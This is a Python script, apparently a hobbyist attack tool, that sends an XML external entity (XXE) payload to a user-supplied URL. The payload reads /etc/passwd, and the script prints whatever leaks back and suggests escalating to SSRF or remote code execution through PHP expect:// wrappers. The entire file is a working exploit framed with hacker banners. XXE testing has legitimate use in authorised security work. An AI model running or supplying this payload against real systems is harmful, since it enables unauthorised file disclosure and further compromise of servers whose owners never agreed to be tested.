import requests
import sys
import time

def hunt_xxe(target_url):
    print(f"\n[*] Bhai, starting The XML Extractor: XXE Injection Hunter...")
    print(f"[*] Target API Endpoint -> {target_url}\n")
    print("==================================================")

    # The Hacker's Malicious XML Payload
    # This payload defines an entity '&xxe;' that reads the local /etc/passwd file
    xxe_payload = """<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<root>
    <user>
        <username>&xxe;</username>
        <email>hacker@arch.com</email>
    </user>
</root>"""

    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) XXE-Hunter/1.0",
        "Content-Type": "application/xml", # Telling the server we are sending XML
        "Accept": "application/xml, text/xml, */*"
    }

    print("[*] Firing XML Payload with External Entity pointing to 'file:///etc/passwd'...\n")

    try:
        # We send the data as raw XML in a POST request
        response = requests.post(target_url, data=xxe_payload, headers=headers, timeout=8)
        status = response.status_code
        text = response.text

        # The Magic Check: Are the contents of /etc/passwd in the response?
        if "root:x:0:0" in text or "/sbin/nologin" in text:
            print(f"   [!!!] JACKPOT 🎯 CRITICAL XXE VULNERABILITY FOUND!")
            print(f"   [!!!] Server Status: HTTP {status}")
            print(f"   [!!!] The server parsed our external entity and leaked local files!")
            print(f"   [!!!] Data Leaked (Snippet):")
            print("-" * 50)
            
            # Print just the first few lines of the leaked file to keep it clean
            leaked_lines = [line for line in text.split('\n') if 'root' in line or 'daemon' in line or 'bin' in line]
            for line in leaked_lines[:5]:
                print(f"         {line.strip()}")
                
            print("-" * 50)
            print("   [+] Next Step: Try to escalate this to SSRF or RCE using PHP expect:// wrappers!\n")
        else:
            print(f"   [-] HTTP {status}: Server accepted request but did not reflect the entity.")
            print("   [-] Either the server is secure against XXE, or this is a 'Blind XXE' (Use OAST to verify).")

    except requests.exceptions.RequestException as e:
        print(f"   [!] Connection Error: {e}")

    print("\n==================================================")
    print("[+] XXE Scan Complete! 💸")

if __name__ == "__main__":
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

    if len(sys.argv) != 2:
        print("Usage: python3 xxe_hunter.py <Target_API_URL>")
        print("Example: python3 xxe_hunter.py 'http://target.com/api/upload_xml'")
        sys.exit(1)
        
    url = sys.argv[1]
    hunt_xxe(url)
